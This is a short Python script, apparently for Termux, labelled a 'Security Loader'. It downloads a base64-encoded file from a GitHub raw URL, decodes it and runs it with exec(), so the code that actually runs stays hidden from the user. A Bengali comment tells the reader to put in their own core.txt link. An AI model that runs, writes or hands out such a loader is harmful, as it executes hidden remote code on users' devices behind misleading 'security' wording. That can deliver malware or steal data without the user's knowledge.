# -*- coding: utf-8 -*-
import os
import sys
import requests
import base64

try:
    os.system('termux-wake-lock')
except:
    pass

# আপনার গিটহাবের raw core.txt ফাইলের লিংক এখানে দিন
CORE_URL = "https://raw.githubusercontent.com/rajavau379-pixel/Raja/refs/heads/main/core.txt"

def load_tool():
    try:
        sys.stdout.write("\033[38;2;34;240;255m [•] Initializing Security Loader...\033[0m\n")
        res = requests.get(CORE_URL, timeout=10)
        if res.status_code == 200:
            encoded_code = res.text.strip()
            decoded_code = base64.b64decode(encoded_code).decode('utf-8')
            exec(decoded_code)
        else:
            print("\033[31m[×] Connection Error! Failed to load secure core.\033[0m")
    except Exception as e:
        print(f"\033[31m[×] Security Error: {e}\033[0m")

if __name__ == "__main__":
    load_tool()
